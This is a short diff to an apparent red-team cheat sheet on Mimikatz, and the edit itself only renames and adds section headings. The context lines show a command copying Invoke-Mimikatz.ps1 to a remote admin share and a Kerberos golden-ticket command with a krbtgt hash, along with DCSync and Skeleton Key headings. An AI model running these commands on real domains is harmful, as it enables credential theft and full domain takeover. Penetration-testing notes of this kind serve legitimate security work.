@@ -178,7 +178,7 @@ If functions not on remote host:-
 ```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
 ``` ls //Server1.local/c$/temp```
 
-# Tickets
+# Mimikatz - Tickets
 
 NTLM == RC4
 #### DCSync
@@ -243,6 +243,7 @@ Invoke-Mimikatz -Command '"kerberos::golden
 538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
+# Mimikatz - Misc Attacks
 
 #### Skeleton Key Attack:-
 
